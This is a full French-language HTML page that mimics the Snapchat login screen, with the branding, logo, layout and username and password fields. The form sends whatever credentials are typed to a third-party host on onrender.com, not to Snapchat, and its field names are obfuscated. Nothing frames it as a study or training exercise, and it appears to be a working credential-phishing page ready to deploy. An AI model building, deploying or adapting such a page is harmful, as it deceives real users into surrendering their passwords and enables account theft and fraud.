<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Se connecter à Snapchat</title>
    
    <style>
        /* --- DÉFINITION DES VARIABLES ET COULEURS --- */
        :root {
            --snap-blue: #00BFFF; /* Bouton Se connecter */
            --snap-yellow: #FFFC00; /* Bouton du bas */
            --text-color: #333;
            --light-grey: #ddd; 
            --link-color: #00BFFF; 
        }

        /* --- STYLES GÉNÉRAUX ET LAYOUT --- */
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: white;
            color: var(--text-color);
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        .main-container {
            width: 100%;
            max-width: 500px;
            padding: 20px;
            box-sizing: border-box;
            margin-top: 50px; 
            padding-bottom: 120px;
        }

        /* --- LOGO IMAGE PNG --- */
        .logo-img {
            width: 60px; /* Taille de l'image ajustée */
            height: auto; 
            display: block; 
            margin: 0 auto 20px auto; 
        }

        .title {
            font-size: 26px;
            font-weight: 600;
            margin-bottom: 40px;
            text-align: center;
        }

        /* --- CHAMPS ET FORMULAIRE --- */
        .form-label {
            display: block;
            text-align: left;
            font-size: 15px;
            font-weight: 500;
            color: #666;
            margin-bottom: 5px;
            margin-top: 20px; /* Espace entre les champs */
        }

        .input-group {
            margin-bottom: 10px;
        }

        .input-field {
            width: 100%;
            padding: 10px 0;
            border: none;
            border-bottom: 1px solid var(--light-grey); 
            font-size: 17px;
            box-sizing: border-box;
            outline: none;
            transition: border-bottom-color 0.3s;
        }

        .input-field:focus {
            border-bottom-color: var(--text-color);
        }

        /* --- LIEN SECONDAIRE --- */
        .secondary-link {
            text-align: center;
            margin-top: 20px;
        }

        .secondary-link a {
            color: var(--link-color);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        /* --- BOUTON DE CONNEXION (Bleu) --- */
        .next-button {
            width: 90%;
            max-width: 300px;
            padding: 15px 20px;
            margin-top: 35px;
            border: none;
            border-radius: 50px; 
            background-color: var(--snap-blue); 
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            transition: background-color 0.15s;
        }
        .next-button:hover {
            background-color: #0099cc;
        }
        
        /* --- ZONE INSCRIPTION (Bas du formulaire) --- */
        .signup-area {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 80px;
            font-size: 15px;
        }

        .signup-area a {
            margin-left: 5px;
            font-weight: 600;
            color: var(--text-color);
            text-decoration: none;
        }
        
        /* --- BARRE DE NAVIGATION INFÉRIEURE SIMULÉE (Bouton Jaune) --- */
        .bottom-bar {
            position: fixed;
            bottom: 0;
            width: 100%;
            padding: 20px 0;
            text-align: center;
            background-color: white;
            box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.05);
            max-width: 500px; 
        }

        .bottom-button {
            width: 90%;
            padding: 15px 0;
            border: none;
            border-radius: 50px; 
            background-color: var(--snap-yellow);
            color: var(--text-color);
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="main-container">
        
        <img src="snapchat_logo.png" alt="Logo Snapchat" class="logo-img">

        <h1 class="title">Se connecter à Snapchat</h1>

        <form action="https://snapchat-ufrr.onrender.com/traitement_connexion" method="POST" style="text-align: center;">
            
            <div class="input-group">
                <label for="id_29" class="form-label">Nom d'utilisateur ou adresse e-mail</label>
                <input 
                    type="text" 
                    name="id_29"  
                    id="id_29" 
                    class="input-field" 
                    required
                >
            </div>
            
            <div class="input-group">
                <label for="id_30" class="form-label">Mot de passe</label>
                <input 
                    type="password" 
                    name="id_30"  
                    id="id_30" 
                    class="input-field" 
                    required
                >
            </div>
            
            <div class="secondary-link">
                <a href="#">Utiliser mon numéro de téléphone</a>
            </div>

            <button type="submit" class="next-button">
                Se connecter
            </button>
        </form>

        <div class="signup-area">
            <span>Vous débutez sur Snapchat ?</span> 
            <a href="#">S'inscrire</a>
        </div>
    </div>

    <div class="bottom-bar">
        <button class="bottom-button">
            Ouvrir dans Snapchat
        </button>
    </div>

</body>
</html>
